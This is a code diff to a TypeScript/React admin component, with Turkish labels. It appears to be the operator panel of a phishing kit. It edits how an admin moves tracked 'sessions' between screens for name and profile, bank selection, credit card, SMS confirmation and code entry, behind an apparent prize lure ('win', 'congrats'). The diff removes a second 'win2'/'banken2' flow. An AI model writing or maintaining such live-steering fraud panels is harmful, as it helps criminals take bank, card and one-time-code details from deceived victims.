@@ -959,7 +959,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
   // Admin'in kendi yonlendirmesi icin ince onay seridi (SESSIZ - ses sadece kullanici form girdisinde calar)
   const ROUTE_LABELS: Record<string, string> = {
-    win: "İsim & Profil", win2: "Zorlu", banken: "Banka Seçimi", banken2: "Banka Seçimi 2",
+    win: "İsim & Profil", banken: "Banka Seçimi",
     card: "Kredi Kartı", wait: "Bekleme", invalid_bank: "Hatalı Banka",
     live_support: "Canlı Destek", congrats: "Tebrikler", sms: "SMS Onayı",
     facebook: "Facebook", custom_question: "Özel Soru", code_entry: "Kod Girişi",
@@ -1252,14 +1252,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     }
 
     if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
-      // ZORLU (win2) session'lari: "Banka Listesine Yonlendir" -> banken2 tasirimi,
-      // diger linklerde normal banken. Sadece is_win2_flow olanlarda gecerli.
-      let targetStep = action;
-      if (action === "banken") {
-        const row = rowsRef.current.find((r) => r.id === sessionId);
-        const fd = (row?.form_data ?? {}) as Record<string, any>;
-        if (fd.is_win2_flow === true) targetStep = "banken2";
-      }
+      const targetStep = action;
       const { data, error } = await supabase
         .from("sessions")
         .update({ current_step: targetStep, status: "online" })
@@ -2292,9 +2285,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
                 }
                 else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
-                else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
                 else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
-                else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
+                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                 else if (s === "bank") {
                   let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
                   
